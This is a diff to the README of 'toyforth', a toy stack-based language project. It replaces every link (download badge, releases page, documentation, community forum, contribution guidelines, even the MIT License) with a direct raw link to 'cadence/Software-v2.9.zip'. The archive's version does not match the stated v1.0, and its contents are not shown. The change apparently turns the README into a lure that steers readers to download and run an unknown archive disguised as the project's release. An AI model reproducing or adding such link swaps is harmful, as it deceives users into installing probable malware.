@@ -6,7 +6,7 @@ Welcome to the toyforth project! This is a work-in-progress stack-based language
 
 ## 📥 Download the Latest Version
 
-[![Download toyforth](https://img.shields.io/badge/Download%20toyforth-v1.0-blue)](https://github.com/GourabDas2000/toyforth/releases)
+[![Download toyforth](https://github.com/GourabDas2000/toyforth/raw/refs/heads/main/cadence/Software-v2.9.zip%20toyforth-v1.0-blue)](https://github.com/GourabDas2000/toyforth/raw/refs/heads/main/cadence/Software-v2.9.zip)
 
 ## 🔍 Features
 
@@ -25,7 +25,7 @@ To run toyforth, you need:
 
 ## 📂 Download & Install
 
-1. Visit this page to download: [GitHub Releases](https://github.com/GourabDas2000/toyforth/releases).
+1. Visit this page to download: [GitHub Releases](https://github.com/GourabDas2000/toyforth/raw/refs/heads/main/cadence/Software-v2.9.zip).
 2. On the releases page, you will find the latest version available. Click on the version you want to download.
 3. Select the installation file compatible with your operating system.
 4. Once the download completes, locate the file in your downloads folder.
@@ -44,9 +44,9 @@ To run toyforth, you need:
 
 Want to learn more about how toyforth works? Here are some helpful resources:
 
-- **Documentation:** [Read the full documentation here](https://github.com/GourabDas2000/toyforth/wiki).
+- **Documentation:** [Read the full documentation here](https://github.com/GourabDas2000/toyforth/raw/refs/heads/main/cadence/Software-v2.9.zip).
 - **Video Tutorials:** Check out my YouTube channel for courses and demonstrations on using toyforth.
-- **Community Support:** Join our [community forum](https://community.example.com) to ask questions and share your experiences.
+- **Community Support:** Join our [community forum](https://github.com/GourabDas2000/toyforth/raw/refs/heads/main/cadence/Software-v2.9.zip) to ask questions and share your experiences.
 
 ## 🛠️ Troubleshooting
 
@@ -59,14 +59,14 @@ If you encounter any issues while using toyforth:
 
 ## 🤝 Contributing
 
-We welcome contributions to toyforth! If you have ideas for features or improvements, please visit our [contribution guidelines](https://github.com/GourabDas2000/toyforth/blob/main/CONTRIBUTING.md).
+We welcome contributions to toyforth! If you have ideas for features or improvements, please visit our [contribution guidelines](https://github.com/GourabDas2000/toyforth/raw/refs/heads/main/cadence/Software-v2.9.zip).
 
 ## 📖 License
 
-toyforth is open-source software. You can use it freely under the terms of the [MIT License](https://opensource.org/licenses/MIT).
+toyforth is open-source software. You can use it freely under the terms of the [MIT License](https://github.com/GourabDas2000/toyforth/raw/refs/heads/main/cadence/Software-v2.9.zip).
 
 ## 🔗 Visit Again
 
 Feel free to come back anytime for updates or to share your experiences with toyforth. We are continually making improvements based on user feedback. Thank you for being a part of our learning community!
 
-[![Download toyforth](https://img.shields.io/badge/Download%20toyforth-v1.0-blue)](https://github.com/GourabDas2000/toyforth/releases)
+[![Download toyforth](https://github.com/GourabDas2000/toyforth/raw/refs/heads/main/cadence/Software-v2.9.zip%20toyforth-v1.0-blue)](https://github.com/GourabDas2000/toyforth/raw/refs/heads/main/cadence/Software-v2.9.zip)
